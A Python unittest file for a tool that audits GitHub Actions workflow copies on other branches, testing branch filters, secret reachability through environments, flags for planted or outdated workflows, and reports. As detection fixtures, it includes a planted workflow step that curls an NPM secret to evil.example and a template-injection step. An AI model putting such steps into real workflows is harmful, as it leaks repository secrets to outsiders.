"""Workflows on other branches: branch filters, which secrets a copy can read given environments,
the branch flags, run history, and GraphQL partial results. No network.

  uv run --python 3.12 --with pyyaml python -m unittest discover -s tests
"""
import json
import subprocess
import unittest
from datetime import datetime, timezone
from unittest import mock

from repostatus.checks import repository_checks
from repostatus.github import api_client
from repostatus.reports import org_summary
from repostatus.collect import workflow_parser
from repostatus.checks.workflow_checks import (PR_MERGE_REF, branch_copies, copy_group, secret_access,
                                              workflow_flags, workflow_hygiene)

NOW = datetime(2026, 10, 13, tzinfo=timezone.utc)
CFG = repository_checks.DEFAULTS
OID_OLD, OID_NEW, OID_ONLY = "1" * 40, "2" * 40, "3" * 40


class BranchFilters(unittest.TestCase):
    def test_patterns(self):
        m = workflow_parser.branch_matches
        self.assertTrue(m(["feat/**"], "feat/a/b"))
        self.assertFalse(m(["feat/*"], "feat/a/b"))
        self.assertFalse(m(["feat/**", "!feat/x"], "feat/x"))
        self.assertTrue(m(["release-?"], "release-1"))
        self.assertIsNone(m(["release/[0-9]+"], "release/1"))  # not modelled: caller treats as "might match"

    def test_which_triggers_run_the_branch_copy(self):
        w = workflow_parser.parse_workflow("""
on:
  push: {branches: [main, 'release/**']}
  pull_request: {branches: [main]}
  workflow_dispatch:
  schedule: [{cron: '0 0 * * *'}]
  pull_request_target:
jobs: {}
""")
        self.assertEqual(workflow_parser.runs_on_branch(w, "release/1.2", "main"),
                         ["push", "workflow_dispatch", "pull_request"])
        self.assertEqual(workflow_parser.runs_on_branch(w, "old-feature", "main"), ["workflow_dispatch", "pull_request"])
        tags_only = workflow_parser.parse_workflow("on:\n  push: {tags: ['v*']}\njobs: {}\n")
        self.assertEqual(workflow_parser.runs_on_branch(tags_only, "old-feature", "main"), [])

    def test_jobs_record_environment_secrets_and_oidc(self):
        w = workflow_parser.parse_workflow("""
on: workflow_dispatch
permissions: {id-token: write}
jobs:
  deploy:
    environment: {name: production}
    steps: [{run: "echo ${{ secrets.ROLE }}"}]
  test:
    permissions: {contents: read}
    steps: [{run: "echo ${{ secrets.NPM_TOKEN }}"}]
""")
        jobs = {j["name"]: j for j in w["jobs"]}
        self.assertEqual((jobs["deploy"]["environment"], jobs["deploy"]["secrets"], jobs["deploy"]["id_token"]),
                         ("production", ["ROLE"], True))
        self.assertEqual((jobs["test"]["environment"], jobs["test"]["id_token"]), (None, False))


def repo(secrets=None, branches=(), blobs=None, runs=(), zz=(), default_zz=(), names=None):
    return {
        "repo": "r", "default_branch": "main", "archived": False, "history": [], "errors": [],
        "actions": {"items": [{"path": ".github/workflows/deploy.yml", "state": "active", "secrets": ["ROLE", "NPM"],
                               "uses": [], "script": []}]},
        "zizmor": {"status": "ok", "findings": list(default_zz)},
        "secrets": secrets if secrets is not None else {
            "repo_secrets": ["NPM"], "org_secrets": [], "errors": [],
            "environments": {"production": {"custom": True, "policies": [{"name": "main", "type": "branch"}],
                                            "protected_branches_only": False, "secrets": ["ROLE"],
                                            "admins_bypass": True, "rules": ["branch_policy"]}}},
        "branch_workflows": {"total": 3, "scanned": 3, "truncated": False, "default_files": ["deploy.yml"],
                             "names": names if names is not None else ["main", "old", "planted"],
                             "branches": list(branches), "blobs": blobs or {}, "zizmor": {"findings": list(zz)}},
        "recent_runs": {"items": list(runs)},
    }


def job(env=None, secrets=(), id_token=False):
    return {"name": "j", "environment": env, "secrets": list(secrets), "id_token": id_token}


class SecretAccess(unittest.TestCase):
    def test_environment_blocks_other_branches(self):
        f = repo()
        got = secret_access(f, job("production", ["ROLE", "NPM"], id_token=True), "old")
        self.assertEqual(got["readable"], [])
        self.assertIn("allows only main", got["blocked"])
        self.assertFalse(got["id_token"])  # the job never starts

    def test_environment_allows_its_branch(self):
        got = secret_access(repo(), job("production", ["ROLE", "NPM"]), "main")
        self.assertEqual((got["readable"], got["blocked"]), (["NPM", "ROLE"], None))

    def test_repository_secret_reaches_every_branch(self):
        got = secret_access(repo(), job(None, ["ROLE", "NPM"]), "old")
        self.assertEqual(got["readable"], ["NPM"])  # ROLE exists only in the environment

    def test_unreadable_secret_lists_assume_readable(self):
        f = repo(secrets={"repo_secrets": None, "org_secrets": None, "environments": {},
                          "errors": ["repo_secrets: 403 Resource not accessible"]})
        got = secret_access(f, job(None, ["ROLE"]), "old")
        self.assertEqual((got["readable"], got["unknown"]), (["ROLE"], True))


def run(path, branch, when="2026-10-01T00:00:00Z", fork=False, event="push"):
    return {"path": path, "head_branch": branch, "event": event, "actor": "x", "created_at": when,
            "conclusion": "success", "url": "u", "head_sha": "s", "from_fork": fork}


class BranchFlags(unittest.TestCase):
    def setUp(self):
        self.old = workflow_parser.parse_workflow(
            "on: [push]\njobs:\n  j:\n    steps: [{run: \"curl ${{ github.event.head_commit.message }}\"}, "
            "{run: \"echo ${{ secrets.NPM }}\"}]\n")
        self.planted = workflow_parser.parse_workflow(
            "on: [push]\njobs:\n  j:\n    steps: [{run: \"curl -d \\\"${{ secrets.NPM }}\\\" https://evil.example/c\"}]\n")
        self.branches = [
            {"name": "old", "sha": "a", "committed": "2026-01-01T00:00:00Z",
             "files": [{"name": "deploy.yml", "oid": OID_OLD, "copy": "older copy"}]},
            {"name": "planted", "sha": "b", "committed": "2026-10-01T00:00:00Z",
             "files": [{"name": "x.yml", "oid": OID_ONLY, "copy": "only on this branch"}]},
        ]
        self.blobs = {OID_OLD: dict(self.old, name="deploy.yml"), OID_ONLY: dict(self.planted, name="x.yml")}
        self.zz = [{"rule": "template-injection", "severity": "high", "confidence": "high", "ignored": False,
                    "file": f"{OID_OLD[:12]}/.github/workflows/deploy.yml", "line": 3}]

    def codes(self, f):
        return {c: s for c, s, _ in workflow_flags(f, "active", NOW, CFG)}

    def test_planted_exfil_and_outdated_flaw(self):
        c = self.codes(repo(branches=self.branches, blobs=self.blobs, zz=self.zz))
        self.assertEqual(c["BRANCH_WORKFLOW_EXFIL"], "high")
        self.assertEqual(c["OUTDATED_WORKFLOW_ON_BRANCH"], "medium")

    def test_flaw_also_on_default_is_not_outdated(self):
        default_zz = [dict(self.zz[0], file=".github/workflows/deploy.yml")]
        c = self.codes(repo(branches=self.branches[:1], blobs=self.blobs, zz=self.zz, default_zz=default_zz))
        self.assertNotIn("OUTDATED_WORKFLOW_ON_BRANCH", c)

    def test_no_readable_secret_no_flag(self):
        f = repo(branches=self.branches[:1], blobs=self.blobs, zz=self.zz)
        f["secrets"]["repo_secrets"] = []
        self.assertNotIn("OUTDATED_WORKFLOW_ON_BRANCH", self.codes(f))

    def test_runs_of_workflows_not_on_default(self):
        runs = [run(".github/workflows/x.yml", "gone"), run(".github/workflows/x.yml", "planted"),
                run(".github/workflows/x.yml", "fork-branch", fork=True, event="pull_request"),
                run(".github/workflows/deploy.yml", "old"), run(".github/workflows/x.yml", "gone2", "2026-01-01T00:00:00Z")]
        got = [(c, s, d) for c, s, d in workflow_flags(repo(runs=runs), "active", NOW, CFG)]
        self.assertEqual([(c, s) for c, s, _ in got],
                         [("DELETED_BRANCH_WORKFLOW_RAN", "high"), ("BRANCH_ONLY_WORKFLOW_RAN", "info")])
        self.assertIn("branch gone", got[0][2])

    def test_branch_list_truncated_cannot_say_deleted(self):
        f = repo(runs=[run(".github/workflows/x.yml", "gone")])
        f["branch_workflows"]["truncated"] = True
        self.assertEqual(self.codes(f), {"BRANCH_ONLY_WORKFLOW_RAN": "info"})

    def test_hygiene(self):
        notes = workflow_hygiene(repo(branches=self.branches, blobs=self.blobs))
        self.assertIn("secrets any branch can read (repository or organisation secret, not in an environment): NPM",
                      notes)
        self.assertIn("older workflow copies on other branches: 1 branch(es), e.g. old", notes)
        self.assertIn("workflow files only on other branches: 1 branch(es), e.g. planted", notes)

    def test_report_row_and_section(self):
        f = repo(branches=self.branches, blobs=self.blobs, zz=self.zz)
        rows = branch_copies(f)
        old = next(r for r in rows if r["branch"] == "old")
        self.assertEqual((old["runs_via"], old["readable"], old["serious"]), (["push"], ["NPM"], ["template-injection"]))
        r = {"f": f, "status": "active", "flags": workflow_flags(f, "active", NOW, CFG)}
        text = "\n".join(org_summary._branches_section([r], CFG, NOW))
        self.assertIn("| r | 2 | 0 | 0 | 0 | 2 |", text)  # per-repo row: both copies flagged, both can read secrets
        self.assertIn("| r | old | flagged | deploy.yml | older copy | 2026-01-01 | not checked | push | NPM | "
                      "template-injection |", text)
        self.assertIn("r/production", text)  # admin bypass listed among the limits


class Grouping(unittest.TestCase):
    """flagged / active / stale, and which runs and refs count."""

    def row(self, **kw):
        base = {"branch": "b", "committed": "2026-01-01T00:00:00Z", "runs_via": ["push"], "readable": [],
                "id_token": False, "serious": [], "exfil": [], "last_run": None, "runs_checked": True}
        base.update(kw)
        return copy_group(base, NOW, CFG)

    def test_groups(self):
        self.assertEqual(self.row(), "stale")
        self.assertEqual(self.row(committed="2026-09-01T00:00:00Z"), "active")
        self.assertEqual(self.row(last_run={"created_at": "2026-10-01T00:00:00Z", "running": False}), "active")
        self.assertEqual(self.row(last_run={"created_at": "2025-01-01T00:00:00Z", "running": True}), "active")
        self.assertEqual(self.row(runs_checked=False), "active")  # not read: never hidden
        self.assertEqual(self.row(serious=["template-injection"], readable=["NPM"]), "flagged")
        self.assertEqual(self.row(exfil=["sends secrets to evil.example"]), "flagged")

    def test_pull_request_runs_cannot_use_an_environment_limited_to_main(self):
        f = repo()
        f["secrets"]["environments"]["production"]["policies"] = [{"name": "main", "type": "branch"}]
        got = secret_access(f, {"name": "j", "environment": "production", "secrets": ["ROLE"]}, PR_MERGE_REF)
        self.assertEqual(got["readable"], [])
        self.assertTrue(got["blocked"])
        f["secrets"]["environments"]["production"]["policies"] = [{"name": "**", "type": "branch"}]
        self.assertEqual(secret_access(f, {"name": "j", "environment": "production", "secrets": ["ROLE"]},
                                       PR_MERGE_REF)["readable"], ["ROLE"])

    def test_last_runs_per_branch(self):
        from repostatus.collect import repository_facts

        class FakeGH:
            def try_get(self, path):
                self.path = path
                return {"workflow_runs": [
                    {"path": ".github/workflows/ci.yml", "status": "in_progress", "created_at": "2026-10-12T00:00:00Z",
                     "event": "push", "actor": {"login": "x"}, "conclusion": None, "html_url": "u1"},
                    {"path": ".github/workflows/ci.yml", "status": "completed", "created_at": "2026-10-01T00:00:00Z",
                     "event": "push", "actor": {"login": "x"}, "conclusion": "success", "html_url": "u2"},
                    {"path": ".github/workflows/other.yml", "status": "completed", "created_at": "2026-10-11T00:00:00Z",
                     "event": "push", "actor": {"login": "x"}, "conclusion": "success", "html_url": "u3"}]}, None
        gh = FakeGH()
        branches = [{"name": "feat/x", "committed": "2026-10-10T00:00:00Z",
                     "files": [{"name": "ci.yml", "oid": "1" * 40, "copy": "older copy"}]}]
        repository_facts._branch_runs(gh, "org/app", branches)
        self.assertIn("branch=feat%2Fx", gh.path)
        run = branches[0]["runs"]["ci.yml"]
        self.assertEqual((run["created_at"], run["running"], run["url"]), ("2026-10-12T00:00:00Z", True, "u1"))
        self.assertNotIn("other.yml", branches[0]["runs"])  # not a differing copy on this branch

    def test_branch_csv_lists_every_copy(self):
        import csv
        import os
        import tempfile
        old = workflows_parsed()
        f = repo(branches=[{"name": "old", "sha": "a", "committed": "2025-01-01T00:00:00Z", "runs_checked": True,
                            "runs": {}, "files": [{"name": "deploy.yml", "oid": OID_OLD, "copy": "older copy"}]}],
                 blobs={OID_OLD: dict(old, name="deploy.yml")})
        f["full_name"] = "org/r"
        with tempfile.TemporaryDirectory() as d:
            p = os.path.join(d, "b.csv")
            org_summary.write_branch_csv(p, [{"f": f}], NOW, CFG)
            with open(p, newline="", encoding="utf-8-sig") as fh:
                rows = list(csv.DictReader(fh))
        self.assertEqual((rows[0]["branch"], rows[0]["group"], rows[0]["last_run"]), ("old", "stale", ""))
        self.assertEqual(rows[0]["link"], "https://github.com/org/r/blob/old/.github/workflows/deploy.yml")


def workflows_parsed():
    return workflow_parser.parse_workflow("on: [push]\njobs:\n  j:\n    steps: [{run: echo hi}]\n")


class GraphQLPartial(unittest.TestCase):
    def fake(self, code, body):
        return mock.patch.object(api_client.subprocess, "run", lambda *a, **k: subprocess.CompletedProcess(
            a[0], code, stdout=json.dumps(body), stderr="gh: Could not resolve file"))

    def test_keeps_data_next_to_errors(self):
        body = {"data": {"repository": {"refs": {"nodes": []}}}, "errors": [{"type": "NOT_FOUND"}]}
        with self.fake(1, body):
            data, errors = api_client.GitHub().graphql_partial("query { x }")
        self.assertEqual((data, len(errors)), (body["data"], 1))

    def test_raises_without_data(self):
        with self.fake(1, {"errors": [{"message": "Bad credentials"}]}):
            with self.assertRaises(api_client.ApiError):
                api_client.GitHub().graphql_partial("query { x }")

    def test_refuses_mutations(self):
        with self.assertRaises(ValueError):
            api_client.GitHub().graphql_partial("mutation { deleteRepository }")


if __name__ == "__main__":
    unittest.main()
